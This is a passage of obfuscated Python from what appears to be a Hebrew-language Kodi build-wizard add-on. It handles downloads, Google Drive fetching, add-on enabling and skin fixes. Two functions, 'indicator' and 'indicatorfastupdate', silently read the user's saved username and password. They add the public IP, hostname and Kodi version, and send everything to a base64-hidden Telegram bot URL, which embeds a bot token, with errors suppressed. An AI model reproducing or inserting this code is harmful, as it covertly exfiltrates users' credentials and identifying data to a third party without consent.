        OO0O000O0O00O00OO =OOO00OO0OOO000O00 /(1024 *1024 )#line:3464
        OOO0OO0OOOO0O0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OO00O0OOO00O000 ,'teal',OO0O000O0O00O00OO )#line:3465
        if (time .time ()-O0O0OOO00O000OO00 )>0 :#line:3466
          O0O0OOO00OO0OO0O0 =O0OOOO0OOOOO0O0O0 /(time .time ()-O0O0OOO00O000OO00 )#line:3467
          O0O0OOO00OO0OO0O0 =O0O0OOO00OO0OO0O0 /1024 #line:3468
        else :#line:3469
         O0O0OOO00OO0OO0O0 =0 #line:3470
        O0OO0O00OOOO00O00 ='KB'#line:3471
        if O0O0OOO00OO0OO0O0 >=1024 :#line:3472
           O0O0OOO00OO0OO0O0 =O0O0OOO00OO0OO0O0 /1024 #line:3473
           O0OO0O00OOOO00O00 ='MB'#line:3474
        if O0O0OOO00OO0OO0O0 >0 and not OOO00000OO0O0OO00 ==100 :#line:3475
            OO0O0O0OO0O00OOOO =(OOO00OO0OOO000O00 -O0OOOO0OOOOO0O0O0 )/O0O0OOO00OO0OO0O0 #line:3476
        else :#line:3477
            OO0O0O0OO0O00OOOO =0 #line:3478
        OOO0O00OOO0O00O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0O0OOO00OO0OO0O0 ,O0OO0O00OOOO00O00 )#line:3479
        OO00O0OOO0O0O0OOO .update (int (OOO00000OO0O0OO00 ),"Downloading "+name ,OOO0OO0OOOO0O0000 ,OOO0O00OOO0O00O0O )#line:3481
  O0000O0OO0O00O000 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3484
  O000000O000O0OO00 .close ()#line:3486
  extract (OOO0000O00OO00000 ,O0000O0OO0O00O000 ,OO00O0OOO0O0O0OOO )#line:3488
  if os .path .exists (O0000O0OO0O00O000 +'/scakemyer-script.quasar.burst'):#line:3489
    if os .path .exists (O0000O0OO0O00O000 +'/script.quasar.burst'):#line:3490
     shutil .rmtree (O0000O0OO0O00O000 +'/script.quasar.burst',ignore_errors =False )#line:3491
    os .rename (O0000O0OO0O00O000 +'/scakemyer-script.quasar.burst',O0000O0OO0O00O000 +'/script.quasar.burst')#line:3492
  if os .path .exists (O0000O0OO0O00O000 +'/plugin.video.kmediatorrent-master'):#line:3494
    if os .path .exists (O0000O0OO0O00O000 +'/plugin.video.kmediatorrent'):#line:3495
     shutil .rmtree (O0000O0OO0O00O000 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3496
    os .rename (O0000O0OO0O00O000 +'/plugin.video.kmediatorrent-master',O0000O0OO0O00O000 +'/plugin.video.kmediatorrent')#line:3497
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3498
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3499
  try :#line:3500
    os .remove (OOO0000O00OO00000 )#line:3501
  except :#line:3502
    pass #line:3503
  OO00O0OOO0O0O0OOO .close ()#line:3504
def dis_or_enable_addon (O00O0000OO0OO0O00 ,OOO00OO000OO0OOO0 ,enable ="true"):#line:3505
    import json #line:3506
    O00OOOO0O000OOOO0 ='"%s"'%O00O0000OO0OO0O00 #line:3507
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0000OO0OO0O00 )and enable =="true":#line:3508
        logging .warning ('already Enabled')#line:3509
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00O0000OO0OO0O00 )#line:3510
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0000OO0OO0O00 )and enable =="false":#line:3511
        return xbmc .log ("### Skipped %s, reason = not installed"%O00O0000OO0OO0O00 )#line:3512
    else :#line:3513
        OOOOO00O0000OOO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OOOO0O000OOOO0 ,enable )#line:3514
        O0OO0OOOOOO0OOO0O =xbmc .executeJSONRPC (OOOOO00O0000OOO00 )#line:3515
        O000O0O00OO0000OO =json .loads (O0OO0OOOOOO0OOO0O )#line:3516
        if enable =="true":#line:3517
            xbmc .log ("### Enabled %s, response = %s"%(O00O0000OO0OO0O00 ,O000O0O00OO0000OO ))#line:3518
        else :#line:3519
            xbmc .log ("### Disabled %s, response = %s"%(O00O0000OO0OO0O00 ,O000O0O00OO0000OO ))#line:3520
    if OOO00OO000OO0OOO0 =='auto':#line:3521
     return True #line:3522
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3523
def chunk_report (OO0OOO0O000000O00 ,O0O0O0OOOO000OO00 ,O0OO0OOOOO0O0OO00 ):#line:3524
   OO0O0O000OO0000OO =float (OO0OOO0O000000O00 )/O0OO0OOOOO0O0OO00 #line:3525
   OO0O0O000OO0000OO =round (OO0O0O000OO0000OO *100 ,2 )#line:3526
   if OO0OOO0O000000O00 >=O0OO0OOOOO0O0OO00 :#line:3528
      sys .stdout .write ('\n')#line:3529
def chunk_read (OOO0O00O00OO0O0O0 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3531
   import time #line:3532
   OOOOOO00O0O0O00OO =int (filesize )*1000000 #line:3533
   OOO00OO0O0O0OOO0O =0 #line:3535
   OO0OOO0OOO00O00OO =time .time ()#line:3536
   O0O000OOO0OOO00O0 =0 #line:3537
   logging .warning ('Downloading')#line:3539
   with open (destination ,"wb")as OO0O00O00O00O00OO :#line:3540
    while 1 :#line:3541
      O00000000000O00O0 =time .time ()-OO0OOO0OOO00O00OO #line:3542
      O0O0OO0O00O0OO000 =int (O0O000OOO0OOO00O0 *chunk_size )#line:3543
      O000OO0OO00O00000 =OOO0O00O00OO0O0O0 .read (chunk_size )#line:3544
      OO0O00O00O00O00OO .write (O000OO0OO00O00000 )#line:3545
      OO0O00O00O00O00OO .flush ()#line:3546
      OOO00OO0O0O0OOO0O +=len (O000OO0OO00O00000 )#line:3547
      OOOOOO0O00OO0O000 =float (OOO00OO0O0O0OOO0O )/OOOOOO00O0O0O00OO #line:3548
      OOOOOO0O00OO0O000 =round (OOOOOO0O00OO0O000 *100 ,2 )#line:3549
      if int (O00000000000O00O0 )>0 :#line:3550
        O00O00OO0OO00O000 =int (O0O0OO0O00O0OO000 /(1024 *O00000000000O00O0 ))#line:3551
      else :#line:3552
         O00O00OO0OO00O000 =0 #line:3553
      if O00O00OO0OO00O000 >1024 and not OOOOOO0O00OO0O000 ==100 :#line:3554
          O0O00OOO0O00OOOOO =int (((OOOOOO00O0O0O00OO -O0O0OO0O00O0OO000 )/1024 )/(O00O00OO0OO00O000 ))#line:3555
      else :#line:3556
          O0O00OOO0O00OOOOO =0 #line:3557
      if O0O00OOO0O00OOOOO <0 :#line:3558
        O0O00OOO0O00OOOOO =0 #line:3559
      dp .update (int (OOOOOO0O00OO0O000 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOOOO0O00OO0O000 ,O0O0OO0O00O0OO000 /(1024 *1024 ),OOOOOO00O0O0O00OO /(1000 *1000 ),O00O00OO0OO00O000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O0O00OOO0O00OOOOO ,60 ))#line:3560
      if dp .iscanceled ():#line:3561
         dp .close ()#line:3562
         break #line:3563
      if not O000OO0OO00O00000 :#line:3564
         break #line:3565
      if report_hook :#line:3567
         report_hook (OOO00OO0O0O0OOO0O ,chunk_size ,OOOOOO00O0O0O00OO )#line:3568
      O0O000OOO0OOO00O0 +=1 #line:3569
   logging .warning ('END Downloading')#line:3570
   return OOO00OO0O0O0OOO0O #line:3571
def googledrive_download (O0O00OO0OOOOOOO00 ,O00000OO0O000O0OO ,OOOOO00OO0OO0OOOO ,O000000O0O0OO0O00 ):#line:3573
    O0OOO00O0000OOO00 =[]#line:3577
    O00O00000OOO0O0O0 =O0O00OO0OOOOOOO00 .split ('=')#line:3578
    O0O00OO0OOOOOOO00 =O00O00000OOO0O0O0 [len (O00O00000OOO0O0O0 )-1 ]#line:3579
    def O00O000OOOOOOO00O (OOOO00OO0OO0O0OO0 ):#line:3581
        for O00O00O000000000O in OOOO00OO0OO0O0OO0 :#line:3583
            logging .warning ('cookie.name')#line:3584
            logging .warning (O00O00O000000000O .name )#line:3585
            OOOOO0O0OO00O0OOO =O00O00O000000000O .value #line:3586
            if 'download_warning'in O00O00O000000000O .name :#line:3587
                logging .warning (O00O00O000000000O .value )#line:3588
                logging .warning ('cookie.value')#line:3589
                return O00O00O000000000O .value #line:3590
            return OOOOO0O0OO00O0OOO #line:3591
        return None #line:3593
    def OO00OO00OOOOO000O (OOOO00OOO00OO000O ,O0O0000O000000O0O ):#line:3595
        O00000O0000OO00OO =32768 #line:3597
        OO0OO0OOO00O0O00O =time .time ()#line:3598
        with open (O0O0000O000000O0O ,"wb")as OO000OOO00O0000O0 :#line:3600
            O0O0O0OO00OOOOO00 =1 #line:3601
            O0O0000O0OOOOOO00 =32768 #line:3602
            try :#line:3603
                OOO00O000000O0O0O =int (OOOO00OOO00OO000O .headers .get ('content-length'))#line:3604
                print ('file total size :',OOO00O000000O0O0O )#line:3605
            except TypeError :#line:3606
                print ('using dummy length !!!')#line:3607
                OOO00O000000O0O0O =int (O000000O0O0OO0O00 )*1000000 #line:3608
            for O0000O00OOO0O000O in OOOO00OOO00OO000O .iter_content (O00000O0000OO00OO ):#line:3609
                if O0000O00OOO0O000O :#line:3610
                    OO000OOO00O0000O0 .write (O0000O00OOO0O000O )#line:3611
                    OO000OOO00O0000O0 .flush ()#line:3612
                    O0O0OOOO00O0O00OO =time .time ()-OO0OO0OOO00O0O00O #line:3613
                    O0OO0O0OOO000OO0O =int (O0O0O0OO00OOOOO00 *O0O0000O0OOOOOO00 )#line:3614
                    if O0O0OOOO00O0O00OO ==0 :#line:3615
                        O0O0OOOO00O0O00OO =0.1 #line:3616
                    OOOOO0O0O00OO00OO =int (O0OO0O0OOO000OO0O /(1024 *O0O0OOOO00O0O00OO ))#line:3617
                    O0OO00OOO0O000OO0 =int (O0O0O0OO00OOOOO00 *O0O0000O0OOOOOO00 *100 /OOO00O000000O0O0O )#line:3618
                    if OOOOO0O0O00OO00OO >1024 and not O0OO00OOO0O000OO0 ==100 :#line:3619
                      O00OOO0O000O0O0O0 =int (((OOO00O000000O0O0O -O0OO0O0OOO000OO0O )/1024 )/(OOOOO0O0O00OO00OO ))#line:3620
                    else :#line:3621
                      O00OOO0O000O0O0O0 =0 #line:3622
                    OOOOO00OO0OO0OOOO .update (int (O0OO00OOO0O000OO0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO00OOO0O000OO0 ,O0OO0O0OOO000OO0O /(1024 *1024 ),OOO00O000000O0O0O /(1000 *1000 ),OOOOO0O0O00OO00OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O00OOO0O000O0O0O0 ,60 ))#line:3624
                    O0O0O0OO00OOOOO00 +=1 #line:3625
                    if OOOOO00OO0OO0OOOO .iscanceled ():#line:3626
                     OOOOO00OO0OO0OOOO .close ()#line:3627
                     break #line:3628
    O0O00O000O0OOOO00 ="https://docs.google.com/uc?export=download"#line:3629
    import urllib2 #line:3634
    import cookielib #line:3635
    from cookielib import CookieJar #line:3637
    O0000OOOO000OO0OO =CookieJar ()#line:3639
    OOOO00O00O000O0OO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O0000OOOO000OO0OO ))#line:3640
    O00O0O0O0O0O0OOOO ={'id':O0O00OO0OOOOOOO00 }#line:3642
    OOOOOO0OO0O00O000 =urllib .urlencode (O00O0O0O0O0O0OOOO )#line:3643
    logging .warning (O0O00O000O0OOOO00 +'&'+OOOOOO0OO0O00O000 )#line:3644
    O000OO0000O00O00O =OOOO00O00O000O0OO .open (O0O00O000O0OOOO00 +'&'+OOOOOO0OO0O00O000 )#line:3645
    O00000OOOOO0O00OO =O000OO0000O00O00O .read ()#line:3646
    for O000O0000OOOOO000 in O0000OOOO000OO0OO :#line:3648
         logging .warning (O000O0000OOOOO000 )#line:3649
    O0OOO0O00OOO0OOOO =O00O000OOOOOOO00O (O0000OOOO000OO0OO )#line:3650
    logging .warning (O0OOO0O00OOO0OOOO )#line:3651
    if O0OOO0O00OOO0OOOO :#line:3652
        OO0OOO0O00OOO0000 ={'id':O0O00OO0OOOOOOO00 ,'confirm':O0OOO0O00OOO0OOOO }#line:3653
        OOO0O00O00OOOO000 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3654
        OOOOOO0OO0O00O000 =urllib .urlencode (OO0OOO0O00OOO0000 )#line:3655
        O000OO0000O00O00O =OOOO00O00O000O0OO .open (O0O00O000O0OOOO00 +'&'+OOOOOO0OO0O00O000 )#line:3656
        chunk_read (O000OO0000O00O00O ,report_hook =chunk_report ,dp =OOOOO00OO0OO0OOOO ,destination =O00000OO0O000O0OO ,filesize =O000000O0O0OO0O00 )#line:3657
    return (O0OOO00O0000OOO00 )#line:3661
def kodi17Fix ():#line:3662
	O000OO0O0O0000000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3663
	OO0OO0000OO000000 =[]#line:3664
	for OOO0000O0O0OO00O0 in sorted (O000OO0O0O0000000 ,key =lambda O00O0O00O00OOOOOO :O00O0O00O00OOOOOO ):#line:3665
		O0O0000000000OO00 =os .path .join (OOO0000O0O0OO00O0 ,'addon.xml')#line:3666
		if os .path .exists (O0O0000000000OO00 ):#line:3667
			O00O0O000O0OOO000 =OOO0000O0O0OO00O0 .replace (ADDONS ,'')[1 :-1 ]#line:3668
			O0O0000OOO0OO0O00 =open (O0O0000000000OO00 )#line:3669
			O0000O00O0OO000O0 =O0O0000OOO0OO0O00 .read ()#line:3670
			OO0OOOOOOOO0OOO0O =parseDOM (O0000O00O0OO000O0 ,'addon',ret ='id')#line:3671
			O0O0000OOO0OO0O00 .close ()#line:3672
			try :#line:3673
				OOO00OO0O00OOOOO0 =xbmcaddon .Addon (id =OO0OOOOOOOO0OOO0O [0 ])#line:3674
			except :#line:3675
				try :#line:3676
					log ("%s was disabled"%OO0OOOOOOOO0OOO0O [0 ],xbmc .LOGDEBUG )#line:3677
					OO0OO0000OO000000 .append (OO0OOOOOOOO0OOO0O [0 ])#line:3678
				except :#line:3679
					try :#line:3680
						log ("%s was disabled"%O00O0O000O0OOO000 ,xbmc .LOGDEBUG )#line:3681
						OO0OO0000OO000000 .append (O00O0O000O0OOO000 )#line:3682
					except :#line:3683
						if len (OO0OOOOOOOO0OOO0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00O0O000O0OOO000 ,xbmc .LOGERROR )#line:3684
						else :log ("Unabled to enable: %s"%OOO0000O0O0OO00O0 ,xbmc .LOGERROR )#line:3685
	if len (OO0OO0000OO000000 )>0 :#line:3686
		OOOOO00O0000O00OO =0 #line:3687
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3688
		for O00O0O0O00O000OO0 in OO0OO0000OO000000 :#line:3689
			OOOOO00O0000O00OO +=1 #line:3690
			O0O0000O0O0O00OO0 =int (percentage (OOOOO00O0000O00OO ,len (OO0OO0000OO000000 )))#line:3691
			DP .update (O0O0000O0O0O00OO0 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00O0O0O00O000OO0 ))#line:3692
			addonDatabase (O00O0O0O00O000OO0 ,1 )#line:3693
			if DP .iscanceled ():break #line:3694
		if DP .iscanceled ():#line:3695
			DP .close ()#line:3696
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3697
			sys .exit ()#line:3698
		DP .close ()#line:3699
	forceUpdate ()#line:3700
def indicator ():#line:3702
       try :#line:3703
          import json #line:3704
          wiz .log ('FRESH MESSAGE')#line:3705
          OO0O0O00000000O0O =(ADDON .getSetting ("user"))#line:3706
          OOO0O0OO0000OOO00 =(ADDON .getSetting ("pass"))#line:3707
          OOOO0OOO0O0O00OOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3708
          OO00OO000O0OO0O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3709
          O0OO0O0O00O0OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3710
          OO00O0O0O0OO0OO0O =str (json .loads (O0OO0O0O00O0OO0O0 )['ip'])#line:3711
          OOOO000000O00000O =OO0O0O00000000O0O #line:3712
          OO0O00OO0O0O00O00 =OOO0O0OO0000OOO00 #line:3713
          import socket #line:3714
          O0OO0O0O00O0OO0O0 =urllib2 .urlopen (OO00OO000O0OO0O0O .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OOOO000000O00000O +' - '+OO0O00OO0O0O00O00 +' - '+OOOO0OOO0O0O00OOO +' - '+OO00O0O0O0OO0OO0O ).readlines ()#line:3715
       except :pass #line:3717
def indicatorfastupdate ():#line:3719
       try :#line:3720
          import json #line:3721
          wiz .log ('FRESH MESSAGE')#line:3722
          OOO0000OO0O0O0OOO =(ADDON .getSetting ("user"))#line:3723
          OOO0000O0O0O0O000 =(ADDON .getSetting ("pass"))#line:3724
          O0OOO0OOOO0OO000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3725
          O0O0O00OOOO00OOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3727
          OO0OOO0O0OOOO0O00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3728
          OOO0O000O0000O000 =str (json .loads (OO0OOO0O0OOOO0O00 )['ip'])#line:3729
          O00O00000O0O00OOO =OOO0000OO0O0O0OOO #line:3730
          O0OO0O000O000O000 =OOO0000O0O0O0O000 #line:3731
          import socket #line:3733
          OO0OOO0O0OOOO0O00 =urllib2 .urlopen (O0O0O00OOOO00OOO0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00O00000O0O00OOO +' - '+O0OO0O000O000O000 +' - '+O0OOO0OOOO0OO000O +' - '+OOO0O000O0000O000 ).readlines ()#line:3734
       except :pass #line:3736
def skinfix18 ():#line:3738
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3739
		OO00O0000O0OO0O00 =wiz .workingURL (SKINID18DDONXML )#line:3740
		if OO00O0000O0OO0O00 ==True :#line:3741
			O0OO000O000O00OO0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3742
			if len (O0OO000O000O00OO0 )>0 :#line:3743
				OO0OO0O0OO000O0O0 ='%s-%s.zip'%(SKINID18 ,O0OO000O000O00OO0 [0 ])#line:3744
				OOOOOOOOO00OOO00O =wiz .workingURL (SKIN18ZIPURL +OO0OO0O0OO000O0O0 )#line:3745
				if OOOOOOOOO00OOO00O ==True :#line:3746
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3747
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3748
					O0000OO000OOOOO00 =os .path .join (PACKAGES ,OO0OO0O0OO000O0O0 )#line:3749
					try :os .remove (O0000OO000OOOOO00 )#line:3750
					except :pass #line:3751
					downloader .download (SKIN18ZIPURL +OO0OO0O0OO000O0O0 ,O0000OO000OOOOO00 ,DP )#line:3752
					extract .all (O0000OO000OOOOO00 ,HOME ,DP )#line:3753
					try :#line:3754
						O00O00O00000OO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3755
						OO000OO00OO00OOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3756
						os .rename (O00O00O00000OO000 ,OO000OO00OO00OOOO )#line:3757
					except :#line:3758
						pass #line:3759
					try :#line:3760
						O000OOOOOOOO000OO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');OO00O0O0OO0O00O00 =O000OOOOOOOO000OO .read ();O000OOOOOOOO000OO .close ()#line:3761
						O000OO000OOO000O0 =wiz .parseDOM (OO00O0O0OO0O00O00 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3762
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OO000OOO000O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3763
					except :#line:3764
						pass #line:3765
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3766
					DP .close ()#line:3767
					xbmc .sleep (500 )#line:3768
					wiz .forceUpdate (True )#line:3769
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3770
				else :#line:3771
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3772
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOOOOOOO00OOO00O ,xbmc .LOGERROR )#line:3773
			else :#line:3774
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3775
		else :#line:3776
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3777
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3778
def skinfix17 ():#line:3779
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3780
		OOOO00000OOO000O0 =wiz .workingURL (SKINID17DDONXML )#line:3781
		if OOOO00000OOO000O0 ==True :#line:3782
			O0O0OOO00OOOO0O0O =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3783
			if len (O0O0OOO00OOOO0O0O )>0 :#line:3784
				OO0OO00O0OO0O0O00 ='%s-%s.zip'%(SKINID17 ,O0O0OOO00OOOO0O0O [0 ])#line:3785
				OO0000OOOOO0OO00O =wiz .workingURL (SKIN17ZIPURL +OO0OO00O0OO0O0O00 )#line:3786
				if OO0000OOOOO0OO00O ==True :#line:3787
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3788
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3789
					O0O00OO0OO00O0O00 =os .path .join (PACKAGES ,OO0OO00O0OO0O0O00 )#line:3790
					try :os .remove (O0O00OO0OO00O0O00 )#line:3791
					except :pass #line:3792
					downloader .download (SKIN17ZIPURL +OO0OO00O0OO0O0O00 ,O0O00OO0OO00O0O00 ,DP )#line:3793
					extract .all (O0O00OO0OO00O0O00 ,HOME ,DP )#line:3794
					try :#line:3795
						O0OO0000O000OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3796
						O000O0OOO00O0000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3797
						os .rename (O0OO0000O000OOOOO ,O000O0OOO00O0000O )#line:3798
					except :#line:3799
						pass #line:3800
					try :#line:3801
						O000000O000O00000 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OOOO0000000000000 =O000000O000O00000 .read ();O000000O000O00000 .close ()#line:3802
						O0OOO0OOO00OOOOO0 =wiz .parseDOM (OOOO0000000000000 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3803
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0OOO00OOOOO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3804
					except :#line:3805
						pass #line:3806
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3807
					DP .close ()#line:3808
					xbmc .sleep (500 )#line:3809
					wiz .forceUpdate (True )#line:3810
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3811
				else :#line:3812
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3813
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0000OOOOO0OO00O ,xbmc .LOGERROR )#line:3814
			else :#line:3815
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3816
		else :#line:3817
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3818
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3819
def fix17update ():#line:3820
	if KODIV >=17 and KODIV <18 :#line:3821
		wiz .kodi17Fix ()#line:3822
		xbmc .sleep (4000 )#line:3823
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3824
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3825
		fixfont ()#line:3826
		OO00O0O00000000O0 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3827
		try :#line:3829
			O0O0OOOO0OOO0000O =open (OO00O0O00000000O0 ,'r')#line:3830
			O0OOO0000O00OOO0O =O0O0OOOO0OOO0000O .read ()#line:3831
			O0O0OOOO0OOO0000O .close ()#line:3832
			OOOO00O0OO0O0OOOO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3833
			OO0OOO00O0O0O0O0O =re .compile (OOOO00O0OO0O0OOOO ).findall (O0OOO0000O00OOO0O )[0 ]#line:3834
			O0O0OOOO0OOO0000O =open (OO00O0O00000000O0 ,'w')#line:3835
			O0O0OOOO0OOO0000O .write (O0OOO0000O00OOO0O .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OO0OOO00O0O0O0O0O ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3836
			O0O0OOOO0OOO0000O .close ()#line:3837
		except :#line:3838
				pass #line:3839
		wiz .kodi17Fix ()#line:3840
		OO00O0O00000000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3841
		try :#line:3842
			O0O0OOOO0OOO0000O =open (OO00O0O00000000O0 ,'r')#line:3843
			O0OOO0000O00OOO0O =O0O0OOOO0OOO0000O .read ()#line:3844
			O0O0OOOO0OOO0000O .close ()#line:3845
			OOOO00O0OO0O0OOOO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3846
			OO0OOO00O0O0O0O0O =re .compile (OOOO00O0OO0O0OOOO ).findall (O0OOO0000O00OOO0O )[0 ]#line:3847
			O0O0OOOO0OOO0000O =open (OO00O0O00000000O0 ,'w')#line:3848
			O0O0OOOO0OOO0000O .write (O0OOO0000O00OOO0O .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OO0OOO00O0O0O0O0O ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3849
			O0O0OOOO0OOO0000O .close ()#line:3850
		except :#line:3851
				pass #line:3852
		swapSkins ('skin.Premium.mod')#line:3853
def fix18update ():#line:3855
	if KODIV >=18 :#line:3856
		xbmc .sleep (4000 )#line:3857
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3858
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3859
		fixfont ()#line:3860
		OO0OOO0OOO0OO0OOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3861
		try :#line:3862
			O0000OO00OOO000OO =open (OO0OOO0OOO0OO0OOO ,'r')#line:3863
			O0O00000O0O0O0O0O =O0000OO00OOO000OO .read ()#line:3864
			O0000OO00OOO000OO .close ()#line:3865
			O00000O0OOOO0O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3866
			O00O00OOO000OOO00 =re .compile (O00000O0OOOO0O0O0 ).findall (O0O00000O0O0O0O0O )[0 ]#line:3867
			O0000OO00OOO000OO =open (OO0OOO0OOO0OO0OOO ,'w')#line:3868
			O0000OO00OOO000OO .write (O0O00000O0O0O0O0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O00O00OOO000OOO00 ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3869
			O0000OO00OOO000OO .close ()#line:3870
		except :#line:3871
				pass #line:3872
		wiz .kodi17Fix ()#line:3873
